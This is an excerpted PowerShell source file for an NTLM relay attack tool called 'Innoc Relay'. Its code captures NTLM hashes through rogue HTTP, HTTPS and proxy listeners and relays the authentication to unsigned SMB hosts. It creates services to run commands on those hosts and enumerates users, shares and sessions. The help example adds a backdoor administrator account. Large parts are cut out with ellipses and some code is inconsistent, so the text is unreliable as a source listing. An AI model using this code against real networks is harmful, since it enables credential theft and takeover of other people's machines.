...
running Innoc Relay through a shell that does not return other output streams. Note that you will not see the
...
IP addresses or systems not running SMB. Innoc-Relay will do quick port checks as part of target selection and
...
.EXAMPLE
Invoke-Innoc -HTTP N
Invoke-InnocRelay -Target 192.168.2.55 -Command "net user Innoc Spring2017 /add && net localgroup administrators Innoc /add"
...
{
    Write-Output "[-] Innoc Relay is already running"
    throw
}

$Innoc_version = "1.501"

if(!$target -and !$Innoc.enumerate)
{
...
if(!$Innoc)
{
    ...
    $Innoc.ADIDNS_table = [HashTable]::Synchronized(@{})
...
$Innoc.relay_running = $true
$Innoc.SMB_relay = $true
...
$Innoc.output_queue.Add("[*] Innoc Relay $Innoc_version started at $(Get-Date -format s)") > $null
...
if($HTTP -eq 'Y')
{
    ...
    {
        $HTTP = "N"
        $Innoc.output_queue.Add("[-] HTTP Capture/Relay Disabled Due To In Use Port $HTTPPort")  > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] HTTP Capture/Relay = Enabled")  > $null

        if($HTTPIP)
        {
            $Innoc.output_queue.Add("[+] HTTP IP Address = $HTTPIP") > $null
        }
...
{
    $Innoc.output_queue.Add("[+] HTTP Capture/Relay = Disabled")  > $null
}
...
if($HTTPS -eq 'Y')
{
    ...
    if($HTTPS_port_check)
    {
        $HTTPS = "N"
        $Innoc.HTTPS = $false
        $Innoc.output_queue.Add("[-] HTTPS Capture/Relay Disabled Due To In Use Port $HTTPSPort")  > $null
    }
    else
    {
        ...
        try
        {
            ...
            $certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $Innoc.certificate_issuer})
            ...
            if(!$certificate_check)
            {
                ...
                $Innoc.HTTPS = $true
                $Innoc.output_queue.Add("[+] HTTPS Capture/Relay = Enabled")  > $null
            }
            else
            {
        ...
        catch
        {
            $HTTPS = "N"
            $Innoc.HTTPS = $false
            $Innoc.output_queue.Add("[-] HTTPS Capture/Relay Disabled Due To Certificate Error")  > $null
        }
...
{
    $Innoc.output_queue.Add("[+] HTTPS Capture/Relay = Disabled")  > $null
}
...
if($Proxy -eq 'Y')
{
    ...
    {
        $HTTP = "N"
        $Innoc.output_queue.Add("[+] Proxy Capture/Relay Disabled Due To In Use Port $ProxyPort")  > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] Proxy Capture/Relay = Enabled")  > $null
...
if($DomainMapping)
{
    $Innoc.output_queue.Add("[+] Domain Mapping = " + ($DomainMapping -join ","))  > $null
    $Innoc.netBIOS_domain = $DomainMapping[0]
    $Innoc.DNS_domain = $DomainMapping[1]
}

$Innoc.output_queue.Add("[+] Relay Attack = " + ($Attack -join ",")) > $null
...
if($Target)
{
    ...
    {
        $Innoc.output_queue.Add("[+] Relay Target = " + ($Target -join ",")) > $null
    }
    elseif($Target.Count -gt 3)
    {
        $Innoc.output_queue.Add("[+] Relay Targets = " + ($Target[0..2] -join ",") + "...") > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] Relay Targets = " + ($Target -join ",")) > $null
    }

    $Innoc.output_queue.Add("[*] Parsing Relay Target List") > $null
    $Innoc.target_list = New-Object System.Collections.ArrayList
    [Array]$target_range = Get-TargetList $Target
    $Innoc.target_list.AddRange($target_range)
}
...
if($TargetExclude)
{
    ...
    {
        $Innoc.output_queue.Add("[+] Relay Target Exclude = " + ($TargetExclude -join ",")) > $null
    }
    elseif($TargetExclude.Count -gt 3)
    {
        $Innoc.output_queue.Add("[+] Relay Targets Exclude = " + ($TargetExclude[0..2] -join ",") + "...") > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] Relay Targets Exclude = " + ($TargetExclude -join ",")) > $null
    }

    $Innoc.output_queue.Add("[*] Parsing Relay Target Exclude List") > $null
    $Innoc.target_exclude_list = New-Object System.Collections.ArrayList
    [Array]$target_range = Get-TargetList $TargetExclude
    $Innoc.target_exclude_list.AddRange($TargetExclude)
}
...
if($Username)
{
    ...
    {
        $Innoc.output_queue.Add("[+] Relay Username = " + ($Username -join ",")) > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] Relay Usernames = " + ($Username -join ",")) > $null
    }
...
{
    $Innoc.output_queue.Add("[+] Relay Auto Disable = Enabled") > $null
}
else
{
    $Innoc.output_queue.Add("[+] Relay Auto Disable = Disabled") > $null
}

if($RelayAutoExit -eq 'Y')
{
    $Innoc.output_queue.Add("[+] Relay Auto Exit = Enabled") > $null
}
else
{
    $Innoc.output_queue.Add("[+] Relay Auto Exit = Disabled") > $null
}

if($Service)
{
    $Innoc.output_queue.Add("[+] Relay Service = $Service") > $null
}
...
if($ConsoleOutput -ne 'N')
{
    ...
    {
        $Innoc.output_queue.Add("[+] Real Time Console Output = Enabled")  > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] Real Time Console Output = $ConsoleOutput")  > $null
    }
...
else
{
    ...
    if($Innoc.tool -eq 1)
    {
        $Innoc.output_queue.Add("[!] Real Time Console Output Disabled Due To External Tool Selection") > $null
    }
    else
    {
        $Innoc.output_queue.Add("[+] Real Time Console Output = Disabled") > $null
    }
...
if($FileOutput -eq 'Y')
{
    $Innoc.output_queue.Add("[+] Real Time File Output = Enabled") > $null
    $Innoc.output_queue.Add("[+] Output Directory = $output_directory") > $null
    $Innoc.file_output = $true
}
else
{
    $Innoc.output_queue.Add("[+] Real Time File Output = Disabled") > $null
}
...
if(!$Innoc.netBIOS_domain)
{
    ...
    try
    {
        ...
        if(!$Innoc.domain_mapping_table.ContainsKey($Innoc.netBIOS_domain))
        {
...
if($Innoc.enumerate)
{
    $Innoc.output_queue.Add("[*] Performing DNS on imported targets") > $null

    for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
    {

        if($Innoc.enumerate[$i].Hostname -and !$Innoc.enumerate[$i].IP -and $Innoc.enumerate[$i]."DNS Record" -ne $false)
        {
            $DNS_lookup = $true

            try
            {
                $IP_list = [System.Net.Dns]::GetHostEntry($Innoc.enumerate[$i].Hostname)
                ...
                foreach($entry in $IP_list.AddressList)
                {
                    ...
                    {
                        $Innoc.enumerate[$i].IP = $entry.IPAddressToString
                        $Innoc.enumerate[$i]."DNS Record" = $true
                        $Innoc.enumerate[$i]."IPv6 Only" = $false
                ...
                {
                    $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $($Innoc.enumerate[$i].Hostname) not supported") > $null
                    $Innoc.enumerate[$i]."IPv6 Only" = $true
                }

            }
            catch
            {
                $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $($Innoc.enumerate[$i].Hostname) failed") > $null
                $Innoc.enumerate[$i]."DNS Record" = $false
            }
    ...
    if($DNS_lookup)
    {
        $Innoc.output_queue.Add("[+] DNS lookups complete") > $null
        $DNS_lookup = $false
    }
    else
    {
        $Innoc.output_queue.Add("[+] No DNS lookups required") > $null
    }

}

if($Innoc.target_list)
{
    $Innoc.output_queue.Add("[*] Performing DNS lookups on target list") > $null

    for($i = 0;$i -lt $Innoc.target_list.Count;$i++)
    {

        if(!($Innoc.target_list[$i] -as [IPAddress] -as [Bool]))
        {
            $DNS_lookup = $true

            try
            {
                $IP_list = [System.Net.Dns]::GetHostEntry($Innoc.target_list[$i])
                ...
                foreach($entry in $IP_list.AddressList)
                {
                    ...
                    if($entry.AddressFamily -eq 'InterNetwork')
                    {
                        $Innoc.target_list[$i] = $entry.IPAddressToString
                        $target_keep = $true
                    }

                    if(!$target_keep)
                    {
                        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $($Innoc.target_list[$i]) not supported") > $null
                        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($Innoc.target_list[$i]) from target list") > $null
                        $Innoc.target_list.RemoveAt($i)
                        $i -= 1
                    }
            ...
            {
                $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $($Innoc.target_list[$i]) failed") > $null
                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($Innoc.target_list[$i]) from target list") > $null
                $Innoc.target_list.RemoveAt($i)
                $i -= 1
            }
    ...
    if($DNS_lookup)
    {
        $Innoc.output_queue.Add("[+] DNS lookups on complete") > $null
        $DNS_lookup = $false
    }
    else
    {
...
if($Innoc.target_exclude_list)
{
    $Innoc.output_queue.Add("[*] Performing DNS lookups on excluded targets list") > $null

    for($i = 0;$i -lt $Innoc.target_exclude_list.Count;$i++)
    {

        if(!($Innoc.target_exclude_list[$i] -as [IPAddress] -as [Bool]))
        {
            $DNS_lookup = $true

            try
            {
                $IP_list = [System.Net.Dns]::GetHostEntry($Innoc.target_exclude_list[$i])
                ...
                foreach($entry in $IP_list.AddressList)
                {
                    ...
                    if($entry.AddressFamily -eq 'InterNetwork')
                    {
                        $Innoc.target_exclude_list[$i] = $entry.IPAddressToString
                ...
                {
                    $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $($Innoc.target_list[$i]) not supported") > $null
                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($Innoc.target_exclude_list[$i]) from exclusion list") > $null
                    $Innoc.target_exclude_list.RemoveAt($i)
                    $i -= 1
                }
            ...
            {
                $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $($Innoc.target_exclude_list[$i]) failed") > $null
                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($Innoc.target_exclude_list[$i]) from exclusion list") > $null
                $Innoc.target_exclude_list.RemoveAt($i)
                $i -= 1
            }
...
if($Innoc.target_list -and $Innoc.target_exclude_list)
{
    $Innoc.target_list = Compare-Object -ReferenceObject $Innoc.target_exclude_list -DifferenceObject $Innoc.target_list | Where-Object {$_.sideIndicator -eq "=>"} | ForEach-Object {$_.InputObject}
}

if(!$Innoc.target_list -and !$Innoc.enumerated)
{
    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Disabling relay due empty target list") > $null
    $Innoc.SMB_relay = $false
}
...
$ADIDNS_functions_scriptblock =
{
    ...
    function Disable-ADIDNSNode
    {
        ...
        try
        {
            ...
            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node $Node tombstoned in $Zone") > $null
        }
        catch
        {
...
$SMB_relay_functions_scriptblock =
{
    ...
    function Invoke-SMBConnect
    {
        ...
        function Test-SMBPort
        {
            ...
            {     
                ...
                if($target_index -and $Innoc.enumerate[$target_index].IP -eq $target)
                {
                    $Innoc.enumerate[$target_index]."SMB Server" = $SMB_server
                    $Innoc.enumerate[$target_index]."Targeted" = $(Get-Date -format s)
                }
                else
                {
                    $Innoc.enumerate.Add((New-RelayEnumObject -IP $target -SMBServer $SMB_server -Targeted $(Get-Date -format s))) > $null
                }
        ...
        function Invoke-SMBNegotiate
        {
            ...
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage") > $null
                $stage = 'Exit'
            }
                ...
                try
                {
                    ...
                    switch ($stage)
                    {
                        ...
                        'NegotiateSMB'
                        {
                            ...
                            {
                                $SMB2 = $false
                                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Negotiated SMB1 not supported") > $null
                                $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] Trying anonther target") > $null
                                $client.Close()
                                $stage = 'Exit'
                            }
                            else
                            ...
                            {        
                                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Signing is required on $target") > $null
                                $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] Trying another target") > $null
                                $signing = $true
                                $client.Close()
                                $stage = 'Exit'
                            }
                        ...
                        { 
                            ...
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            $stage = 'Exit'
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target") > $null
                        }
        ...
        function Test-SMBTarget
        {
            ...
            for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
            {
                ...
                if(!$Innoc.enumerate[$i].IP -or $Innoc.enumerate[$i].IP -eq $SourceIP -or $Innoc.enumerate[$i].Signing -or $Innoc.enumerate[$i]."SMB2.1" -eq $false -or 
                ($Innoc.enumerate[$i]."SMB Server" -eq $false -and (New-TimeSpan $Innoc.enumerate[$i].Targeted $filter_date).Minutes -lt $TargetRefresh))
                {

                    if($Innoc.enumerate[$i].IP)
                    {
                        $targets_excluded += @($Innoc.enumerate[$i].IP)
                    }
            ...
            if($targets -and $targets_excluded)
            {
                ...
                $sessions_temp = $Innoc.session
                
                if($targets -and $Innoc.relay_history_table.$SourceIP -and
                (Compare-Object -ReferenceObject $targets -DifferenceObject $Innoc.relay_history_table.$SourceIP | Where-Object {$_.SideIndicator -eq "<="}))
                {
                    [Array]$targets = Compare-Object -ReferenceObject $targets -DifferenceObject $Innoc.relay_history_table.$SourceIP -PassThru | Where-Object {$_.SideIndicator -eq "<="}
                }
            ...
            if($targets -and $Innoc.target_list)
            {
                $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $Innoc.target_list -ExcludeDifferent -IncludeEqual -PassThru
            }
            ...
            while(!$target -and $i -lt $targets.Count)
            {
                ...
                if($target)
                {
                    ...
                    if($SMB_port_test_success)
                    {
                        ...
                        $Innoc.enumerate[$target_index]."SMB2.1" = $SMB2
                        $Innoc.enumerate[$target_index].Signing = $signing
                        $Innoc.enumerate[$target_index]."SMB Server" = $SMB_server
                        $Innoc.enumerate[$target_index]."Targeted" = $(Get-Date -format s)
        ...
        if($Innoc.target_list.Count -gt 1 -or (!$Innoc.target_list -and $Innoc.enumerate))
        {
            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Searching for a target") > $null
        }
        ...
        try
        {
            ...
            for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
            {
                ...
                if($Innoc.enumerate[$i].IP -eq $SourceIP -and $Innoc.enumerate[$i].Sessions)
                {
                    [Array]$initiator_sessions = $Innoc.enumerate[$i].Sessions
                    break
                }
            ...
            if($initiator_sessions)
            {
                ...
                foreach($session in $initiator_sessions)
                {
                    ...
                    for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                    {
                        ...
                        if($Innoc.enumerate[$i]."Administrator Users" -contains $session -and $Innoc.enumerate[$i].IP)
                        {
                            $targets += @($Innoc.enumerate[$i].IP)
                        }
                    ...
                    if($targets)
                    {
                        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group match found for session $session on:") > $null
                        $Innoc.output_queue.Add(($targets -join ",")) > $null
            ...
            if($initiator_sessions -and !$targets -and !$target)
            {
                ...
                function Get-SessionGroup
                {
                    ...
                    $group_list = @()
                    $group_table_keys_temp = $Innoc.group_table.keys

                    foreach($group in $group_table_keys_temp)
                    {

                        if($Innoc.group_table.$group -contains $session)
                        {
                            $group_list += $group
                        }
                    ...
                    for($i=0;$i -lt $group_list.Count;$i++)
                    {
                        ...
                        foreach($group in $group_table_keys_temp)
                        {
                            ...
                            if($Innoc.group_table.$group -contains $group_list[$i])
                            {
                                $group_list += $group
                            }
                ...
                if($session_groups)
                {
                    ...
                    foreach($group in $session_groups)
                    {
                        ...
                        for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                        {
                            ...
                            if($Innoc.enumerate[$i]."Administrator Groups" -contains $group -and $Innoc.enumerate[$i].IP)
                            {
                                $targets += @($Innoc.enumerate[$i].IP)
                            }
                        ...
                        if($targets)
                        {
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group nested match found for $group from session $session on:") > $null
                            $Innoc.output_queue.Add(($targets -join ",")) > $null
                            $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv
                            $client = $SMB_target_results[0]
                            $target = $SMB_target_results[1]
            ...
            if(!$targets -and !$target -and $SourceIP)
            {
                ...
                for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                {
                    ...
                    if($Innoc.enumerate[$i].NetSession -contains $SourceIP)
                    {
                        $targets += @($Innoc.enumerate[$i].IP)
                    }
                ...
                if($targets)
                {
                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] NetSession IP match found for $SourceIP on:") > $null
                    $Innoc.output_queue.Add(($targets -join ",")) > $null
            ...
            if(!$targets -and !$target)
            {
                ...
                if($targets)
                {
                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Searching within the following list of systems hosting custom shares:") > $null
                    $Innoc.output_queue.Add(($targets -join ",")) > $null
            ...
            if(!$target -and $TargetMode -eq 'Random')
            {
                ...
                if($Innoc.target_list.Count -gt 1)
                {
                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Selecting a random target") > $null
                }

                if($Innoc.target_list)
                {
                    $SMB_target_results = Test-SMBTarget $Innoc.target_list $SessionLimitUnpriv
                }
                else
                {
                    $targets = @()
                    $Innoc_enumerate.Count = $Innoc.enumerate.Count

                    for($i=0; $i -lt $hostname_encoded.Count; $i++)
                    {

                        if($Innoc_enumerate[$i].Hostname)
                        {
                            $targets += $Innoc_enumerate[$i].Hostname
                        }
                        elseif($Innoc_enumerate[$i].IP)
                        {
                            $targets += $Innoc_enumerate[$i].IP
                        }
            ...
            if($target -and !$Innoc.relay_history_table.$SourceIP)
            {
                $Innoc.relay_history_table.Add($SourceIP,[Array]$target)
            }
            elseif($target -and $Innoc.relay_history_table.$SourceIP -notcontains $target)
            {
                $Innoc.relay_history_table.$SourceIP += $target
            }
    ...
    function Invoke-SMBRelayResponse
    {
        ...
        try
        {
            ...
            if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00'))
            {
                ...
                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication successful for $HTTP_username_full on $Target") > $null              
            }
            else
            {
                ...
                $target_hostname = $Innoc.enumerate[$target_index].Hostname
                $target_DNS_domain = $Innoc.enumerate[$target_index]."DNS Domain"
                ...
                if($FailedLoginStrict -eq 'Y' -or ($HTTP_NTLM_domain_string -and ((!$target_hostname -or !$target_DNS_domain) -or ($target_hostname -and $target_DNS_domain -and $target_hostname -ne $target_DNS_domain))))
                {
                    ...
                    if(!$Innoc.relay_failed_login_table.ContainsKey($HTTP_username_full))
                    {
                        $Innoc.relay_failed_login_table.Add($HTTP_username_full,[Array]$target)
                    }
                    else
                    {
                        $Innoc.relay_failed_login_table.$HTTP_username_full += $target
                    }
                ...
                $client.Close()
                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication failed for $HTTP_username_full on $Target") > $null
            }
    ...
    function Invoke-SMBRelayExecute
    {
        ...
        $stage = 'TreeConnect'
        $message_ID =  $Innoc.session_message_ID_table[$Innoc.session_count]
        ...
        while ($stage -ne 'Exit')
        {
            ...
            try
            {
                ...
                switch ($stage)
                {
                    ...
                    'CheckAccess'
                    {
                        ...
                        if([System.BitConverter]::ToString($client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            ...
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full has command execution privilege on $target") > $null

                            if($Innoc.domain_mapping_table.ContainsKey($HTTP_NTLM_domain_string))
                            {
                                $privileged_user = ($HTTP_NTLM_user_string + "@" + $Innoc.domain_mapping_table.$HTTP_NTLM_domain_string).ToUpper()
                            }
                            else
                            {
                            ...
                            [Array]$privileged_user_list = $Innoc.enumerate[$target_index].Privileged
                            
                            if($privileged_user_list -notcontains $privileged_user)
                            {
                                $privileged_user_list += $privileged_user
                                $Innoc.enumerate[$target_index].Privileged = $privileged_user_list
                            }
                        ...
                        elseif([System.BitConverter]::ToString($client_receive[128..131]) -eq '05-00-00-00')
                        {
                            ...
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full does not have command execution privilege on $Target") > $null
                            $SMB_service_manager_context_handle = $client_receive[108..127]
                            $SMB_close_service_handle_stage = 2
                            $message_ID++
                            $stage = 'CloseServiceHandle'
                    ...
                    'CloseServiceHandle'
                    {
                        ...
                        {
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Service $SMB_service deleted on $Target") > $null
                    ...
                    { 
                        ...
                        {
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Command executed on $Target") > $null
                        }
                        elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '02-00-00-00')
                        {
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Service $SMB_service failed to start on $Target") > $null
                        }
                    ...
                    'StartServiceW'
                    {
                        ...
                        {
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Service $SMB_service created on $Target") > $null
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Trying to execute command on $Target") > $null
                        ...
                        {
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Service $SMB_service creation failed on $Target") > $null
                            $SMB_relay_failed = $true
                        }
                        else
                        {
                    ...
                    'StatusReceived'
                    {
                        ...
                        switch ($stage_current)
                        {
                            ...
                            'TreeDisconnect'
                            {
                                ...
                                {
                                    $Innoc.session_message_ID_table[$Innoc.session_count] = $message_ID
                                    $stage = 'Exit'
                                }
                                else
                                {
                ...
                {
                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Relay failed on $Target") > $null
                    $stage = 'Exit'
                }
            ...
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage_current") > $null
                $stage = 'Exit'
            }
    ...
    function Invoke-SMBRelayEnum
    {
            ...
            try
            {
                ...
                switch ($stage)
                {
                    ...
                    'ParseLookupSids'
                    {
                        ...
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $target $EnumerateGroup group member users:") > $null
                            $Innoc.output_queue.Add($enumerate_group_user_list -join ",") > $null
                        }

                        if($enumerate_group_group_list -gt 0)
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $target $EnumerateGroup group member groups:") > $null
                            $Innoc.output_queue.Add($enumerate_group_group_list -join ",") > $null
                        }
                    ...
                    'ParseSRVSVC'
                    {
                        ...
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $target custom shares:") > $null
                            $Innoc.output_queue.Add($enumerate_share_list -join ",") > $null
                        }

                        if($enumerate_netsession_list.Count -gt 0 -and $action_stage -eq 'NetSession')
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $target NetSessions:") > $null
                            $Innoc.output_queue.Add($enumerate_netsession_list -join ",") > $null
                        }
                    ...
                    'ParseUsers'
                    {
                        ...
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $target local users:") > $null
                            $Innoc.output_queue.Add($enumerate_user_list -join ",") > $null
                        }
                    ...
                    'StatusReceived'
                    {
                        ...
                        switch ($stage_current)
                        {
                            ...
                            'SAMRCloseRequest'
                            {
                                ...
                                if($step -eq 8)
                                {
                                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $Group group not found") > $null
                                    $stage = 'TreeDisconnect'
                                }
                                else
                                {
        ...
        For($i = 0;$i -lt $enumerate_group_user_list.Count;$i++)
        {
            ...
            if($Innoc.domain_mapping_table.ContainsKey($domain))
            {
                $user_update = ($username + "@" + $Innoc.domain_mapping_table.$domain).ToUpper()
        ...
        For($i = 0;$i -lt $enumerate_group_group_list.Count;$i++)
        {
            ...
            if($Innoc.domain_mapping_table.ContainsKey($domain))
            {
                $group_update = ($group + "@" + $Innoc.domain_mapping_table.$domain).ToUpper()
        ...
        {
            $Innoc.enumerate[$target_index]."Administrator Users" = $enumerate_group_user_list
            $Innoc.enumerate[$target_index]."Administrator Groups" = $enumerate_group_group_list
        }

        $Innoc.enumerate[$target_index]."Local Users" = $enumerate_user_list
        $Innoc.enumerate[$target_index].Shares = $enumerate_share_list
        $net_sessions_unique = @()

        foreach($net_session_entry in $enumerate_netsession_list)
        {

            if($Innoc.enumerate[$target_index].NetSessions -notcontains $net_session_entry)
            {
            ...
            for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
            {
                ...
                if($Innoc.enumerate[$i].IP -contains $net_session_IP)
                {
                    $net_session_index = $i
                    break
                }
            ...
            if($net_session_index -and $Innoc.enumerate[$net_session_index].NetSessions -notcontains $net_session_user)
            {
                $Innoc.enumerate[$net_session_index]."NetSessions Mapped" += $net_session_user
            }
            else
            {
                $Innoc.enumerate.Add((New-RelayEnumObject -IP $net_session_IP -NetSessionsMapped $net_session_user)) > $null
            }

        }

        $Innoc.enumerate[$target_index].NetSessions += $net_sessions_unique
        
        if(!$RPC_access_denied)
        {
            $Innoc.enumerate[$target_index].Enumerate = $(Get-Date -format s)
        }
...
{ 
    ...
    {
        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener")
        $HTTP_running = $false

        if($Innoc.file_output)
        {
            $Innoc.log_file_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener")
        }

        if($Innoc.log_output)
        {
            $Innoc.log.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener")
        }

    }

    :HTTP_listener_loop while($Innoc.relay_running -and $HTTP_running)
    {
        $TCP_request = $null
        ...
        if(!$HTTP_client.Connected -and $Innoc.relay_running)
        {
        ...
        if($relay_step -gt 0)
        {
            ...
            if($relay_reset -gt 2)
            {
                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Relay attack resetting") > $null
                $relay_step = 0
            }
        ...
        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*" -or $TCP_request -like "43-4f-4e-4e-45-43-54*")
        {
            ...
            {
                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $HTTP_method request for $HTTP_request_raw_URL received from $HTTP_source_IP") > $null
                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP") > $null

                if($HTTP_header_user_agent)
                {
                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent") > $null
                }

                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                {
                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] - $HTTP_type($HTTPPort) ignoring wpad.dat request due to user agent from $HTTP_source_IP") > $null
                }
            ...
            if($HTTP_header_authorization.StartsWith('NTLM '))
            {
                ...
                if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                {
                    ...
                    if($Innoc.SMB_relay -and $relay_step -eq 0)
                    {
                        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) to SMB relay initiated by $HTTP_source_IP") > $null
                        ...
                        if(!$target)
                        {
                            $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] Eligible target not found") > $null
                            $relay_step = 0
                        }
                        elseif(!$SMB_client.connected)
                        {
                            ...
                            for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                            {
                                ...
                                if($Innoc.enumerate[$i].IP -eq $target -and !$Innoc.enumerate[$i]."Signing")
                                {
                                    $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] Relay target $target is not responding") > $null
                                    break
                                }
                        ...
                        if($relay_step -eq 1)
                        {
                            ...
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Received challenge $NTLM_challenge for relay from $Target") > $null
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Providing challenge $NTLM_challenge for relay to $HTTP_source_IP") > $null
                            $relay_step = 2
                        }
                        else
                        {
                ...
                elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
                {
                    ...
                    if($HTTP_NTLM_length -eq 24) # NTLMv1
                    {
                        ...
                        if($NTLM_challenge -and $NTLM_response -and ($Innoc.machine_accounts -or (!$Innoc.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {     
                            $Innoc.NTLMv1_list.Add($HTTP_NTLM_hash) > $null
                        
                            if(!$Innoc.console_unique -or ($Innoc.console_unique -and $Innoc.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                            {
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:") > $null
                                $Innoc.output_queue.Add($HTTP_NTLM_hash) > $null
                            }
                            else
                            {
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:`n[not unique]") > $null
                            }

                            if($Innoc.file_output -and (!$Innoc.file_unique -or ($Innoc.file_unique -and $Innoc.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                            {
                                $Innoc.NTLMv1_file_queue.Add($HTTP_NTLM_hash) > $null
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type written to " + "Innoc-NTLMv1.txt") > $null
                            }

                            if($Innoc.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
                            {
                                $Innoc.NTLMv1_username_list.Add("$HTTP_source_IP $HTTP_username_full") > $null
                            }
                    ...
                    {   
